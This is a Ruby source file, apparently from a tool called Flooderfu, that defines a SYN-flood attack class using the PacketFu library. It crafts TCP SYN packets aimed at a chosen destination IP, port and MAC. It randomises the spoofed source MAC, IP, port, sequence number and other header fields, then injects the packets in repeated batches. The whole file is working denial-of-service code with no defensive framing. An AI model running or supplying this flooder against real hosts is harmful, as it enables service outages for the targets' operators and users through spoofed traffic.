# -*- encoding: utf-8 -*-
require 'packetfu'

module Flooderfu
  module Syn
    class Attack

      attr_accessor :packet, :injection, :options

      def initialize(opts)
        @options = opts
        @injection = ::PacketFu::Inject.new(:iface => @options.interface)
        craft_package!
      end

      def start!
        puts "syn flooding #{@options.desination_ip}:#{@options.desination_port}"
        time = Time.now
        @options.iterations.times do |c|
          packets = []
          puts "filling the array with #{@options.size} different packets..."
          @options.size.times do |s|
            @package.eth_header.eth_saddr = random_mac
            @package.ip_header.ip_saddr = random_ip
            @package.ip_header.ip_id = rand(0x10000)
            @package.ip_header.ip_ttl = rand(0x80) + 0x80
            @package.tcp_header.tcp_win = rand(0x1000) + 1
            @package.tcp_header.tcp_sport = random_port
            @package.tcp_header.tcp_seq = rand(0x100000000)
            @package.recalc
            packets << @package.to_s
          end
          @injection.array = packets
          @injection.inject
          puts "here comes packet number #{(c+1)*@options.size}"
        end

        puts "elapsed time for #{@options.iterations*@options.size} packets: #{Time.now - time} seconds"
      end

      def change

      end

      def valid_options?

      end

      protected

      def craft_package!
        @package = PacketFu::TCPPacket.new
        @package.eth_header.eth_daddr = @options.desination_mac
        @package.ip_header.ip_proto = 6
        @package.ip_header.ip_daddr = @options.desination_ip
        @package.tcp_header.tcp_dport = @options.desination_port
        @package.tcp_header.tcp_flags.syn = 1
        @package.tcp_header.tcp_ack = 0
      end

    end
  end
end